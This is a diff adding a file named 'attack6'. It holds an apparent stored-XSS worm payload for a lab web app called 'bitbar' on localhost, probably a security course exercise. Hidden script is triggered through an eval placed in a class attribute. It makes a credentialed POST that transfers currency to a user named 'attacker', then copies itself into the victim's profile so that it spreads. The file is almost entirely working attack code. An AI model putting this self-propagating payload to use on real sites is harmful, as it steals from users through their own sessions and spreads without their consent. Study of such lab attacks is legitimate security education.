@@ -1,0 +1,30 @@
+attack6
+
+
+<span id="wrap">
+<span id="bitbar_count" class="eval(document['getElementById']('pxy')['innerHTML'])"></span>
+<span id="pxy">
+document.getElementById('pxy').style.display = "none";
+setTimeout(function(){
+
+    var request = new XMLHttpRequest();
+    request.open("POST", "http://localhost:3000/post_transfer");
+    request.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+    request.withCredentials = true;
+    try {
+        request.send("quantity=1".concat(String.fromCharCode(38)).concat("destination_username=attacker"));
+    } catch (err) {
+    //
+    } finally {
+        request = new XMLHttpRequest();
+        request.open("POST", "http://localhost:3000/set_profile", true);
+        request.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        request.withCredentials = true;
+        request.send("new_profile=".concat(escape(document.getElementById('wrap').outerHTML)));
+    }
+
+}, 0);
+10;
+</span>
+<p>233333</p>
+</span>
